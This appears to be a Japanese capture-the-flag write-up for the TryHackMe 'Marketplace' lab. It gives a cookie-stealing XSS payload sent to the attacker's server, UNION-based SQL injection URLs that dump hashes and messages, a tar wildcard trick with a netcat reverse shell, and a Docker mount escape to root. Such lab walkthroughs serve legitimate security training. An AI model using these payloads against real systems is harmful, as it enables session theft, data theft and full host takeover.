# The Marketplace CTF

https://tryhackme.com/room/marketplace

## Enumeration

```shell
TARGET=10.10.2.175
sudo bash -c "echo $TARGET   marketplace.thm >> /etc/hosts"
```

### ポートスキャン

```sh
$ rustscan -a $TARGET
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.2.175:22
Open 10.10.2.175:80
Open 10.10.2.175:32768
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 11:18 JST
Initiating Ping Scan at 11:18
Scanning 10.10.2.175 [4 ports]
Completed Ping Scan at 11:18, 0.31s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:18
Scanning marketplace.thm (10.10.2.175) [3 ports]
Discovered open port 22/tcp on 10.10.2.175
Discovered open port 32768/tcp on 10.10.2.175
Discovered open port 80/tcp on 10.10.2.175
Completed SYN Stealth Scan at 11:18, 0.36s elapsed (3 total ports)
Nmap scan report for marketplace.thm (10.10.2.175)
Host is up, received reset ttl 60 (0.28s latency).
Scanned at 2025-06-18 11:18:34 JST for 1s

PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 61
80/tcp    open  http        syn-ack ttl 60
32768/tcp open  filenet-tms syn-ack ttl 60

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
           Raw packets sent: 7 (284B) | Rcvd: 5 (424B)
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://marketplace.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 403) [Size: 392]
/admin                (Status: 403) [Size: 392]
/Admin                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/LogIn                (Status: 200) [Size: 857]
/LOGIN                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/Messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/NEW                  (Status: 302) [Size: 28] [--> /login]
/New                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/signUp               (Status: 200) [Size: 667]
/Signup               (Status: 200) [Size: 667]
/SignUp               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189]
```

画面から把握できる以上の情報は無し。

## XSS

最初、メッセージ送信で下記の XSS を試みたが反応が無かった。

```
hello<script>document.write('<img src="http://10.13.85.243:8000/' + document.cookie + '">')</script>
```

NewItem の説明に同じ XSS を仕掛け、それを Report 機能で送信すると、michael のトークンを入手できた。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.2.175 - - [18/Jun/2025 12:00:17] code 404, message File not found
10.10.2.175 - - [18/Jun/2025 12:00:17] "GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NTAyMTU2MTZ9.UHvEd9tjZlpdFMR3za55LFcV300uE2mf6vVztWOvJEU HTTP/1.1" 404 -
```

このトークンをブラウザで設定すると、Admin パネルに移動できた。

## SQL インジェクション

user API に対して SQL インジェクションを試したら下記のエラーが表示された。

http://10.10.116.157/admin?user=1%27%20or%20%271%27=%271

```
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or '1'='1' at line 1
```

sqlmap を実行したら、トークンが無効化された。レート制限があると思われる。

```sh
$ sqlmap -r ./req-user.txt -p user --dbs -batch
```

手動 SQLi

http://10.10.116.157/admin?user=100%20union%20select%201,group_concat(password),3,4%20from%20users

4 ユーザー分のパスワードハッシュを取れた。しかし、hashcat を実行してもクラックできなかった。

```sh
User $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,$2b$10$jKv2CtS1tviW0QcCrkNAU.PWHNRhyarrphbUc1pHfzJ.6oIrNWzQq
ID: 1
Is administrator: true
```

データベース名

http://10.10.116.157/admin?user=100%20union%20select%201,database(),3,4%20from%20users

```
User marketplace
ID: 1
Is administrator: true
```

テーブル名

http://10.10.116.157/admin?user=100%20union%20select%201,group_concat(table_name),3,4 from information_schema.tables where table_schema = 'marketplace'

```
User items,messages,users
ID: 1
Is administrator: true
```

列名

http://10.10.116.157/admin?user=100%20union%20select%201,group_concat(column_name),3,4 from information_schema.columns where table_name = 'users'
http://10.10.116.157/admin?user=100%20union%20select%201,group_concat(column_name),3,4 from information_schema.columns where table_name = 'items'
http://10.10.116.157/admin?user=100%20union%20select%201,group_concat(column_name),3,4 from information_schema.columns where table_name = 'messages'

```
users:
id,username,password,isAdministrator

items:
id,author,title,description,image

messages:
id,user_from,user_to,message_content,is_read
```

メッセージ

http://10.10.116.157/admin?user=100%20union%20select%20group_concat(user_to),group_concat(message_content),3,4 from messages

```
User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: [REDACTED]
Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
Thank you for your report. We have reviewed the listing and found nothing that violates our rules.
Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
Thank you for your report. We have reviewed the listing and found nothing that violates our rules.

3,4,4,2,1,4,4
```

1 番目のメッセージに変更後のパスワードが出ており、宛先は jake。

パスワードを使って SSH 接続できた。

```sh
$ ssh jake@10.10.116.157
```

## 権限昇格

michael として /opt/backups/backup.sh を実行できる。

```sh
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

tar コマンドでワイルドカードを使用している。

```sh
jake@the-marketplace:~$ ls -al /opt/backups/backup.sh
-rwxr-xr-x 1 michael michael 73 Aug 23  2020 /opt/backups/backup.sh

jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

ファイル名を tar コマンドのオプションのように見せかけるテクニック。

```sh
jake@the-marketplace:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.85.243 8888 >/tmp/f" > shell.sh

jake@the-marketplace:~$ touch "/home/jake/--checkpoint-action=exec=sh shell.sh"

jake@the-marketplace:~$ touch "/home/jake/--checkpoint=1"

jake@the-marketplace:~$ ls -al
（抜粋）
-rw-rw-r-- 1 jake jake    0 Jun 18 05:19 '--checkpoint=1'
-rw-rw-r-- 1 jake jake    0 Jun 18 05:19 '--checkpoint-action=exec=sh shell.sh'
-rw-rw-r-- 1 jake jake   80 Jun 18 05:19  shell.sh
```

エクスプロイト

```sh
ake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: user.txt: Cannot open: Permission denied
rm: cannot remove '/tmp/f': No such file or directory
```

リバースシェル取得成功

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.116.157] 34358
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

## Docker エスケープ

docker。cap_sys_admin などが付いている。

```sh
michael@the-marketplace:~$ docker ps
CONTAINER ID        IMAGE                        COMMAND                  CREATED             STATUS              PORTS                     NAMES
49ecb0cfeba8        nginx                        "/docker-entrypoint.…"   4 years ago         Up About an hour    0.0.0.0:80->80/tcp        themarketplace_nginx_1
3c6f21da8043        themarketplace_marketplace   "bash ./start.sh"        4 years ago         Up About an hour    0.0.0.0:32768->3000/tcp   themarketplace_marketplace_1
59c54f4d0f0c        mysql                        "docker-entrypoint.s…"   4 years ago         Up About an hour    3306/tcp, 33060/tcp       themarketplace_db_1

michael@the-marketplace:~$ capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=1002(michael)
gid=1002(michael)
groups=999(docker),1002(michael)
```

イメージ一覧

```sh
michael@the-marketplace:~$ docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        4 years ago         2.16GB
nginx                        latest              4bb46517cac3        4 years ago         133MB
node                         lts-buster          9c4cc2688584        4 years ago         886MB
mysql                        latest              0d64f46acfd1        4 years ago         544MB
alpine                       latest              a24bb4013296        5 years ago         5.57MB
```

エクスプロイト

```sh
michael@the-marketplace:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

エスケープ成功

```sh
# ls -al /root
total 28
drwx------  4 root root 4096 Aug 23  2020 .
drwxr-xr-x 23 root root 4096 Aug 23  2020 ..
lrwxrwxrwx  1 root root    9 Aug 23  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Aug 23  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Aug 23  2020 .ssh
-r--------  1 root root   38 Aug 23  2020 root.txt
# cat /root/root.txt
THM{.................................}
```

## 振り返り

- XSS、SQLi、ワイルドカード不正利用による権限昇格、Docker エスケープと、多彩な課題が盛り込まれていて楽しかった。良い復習。
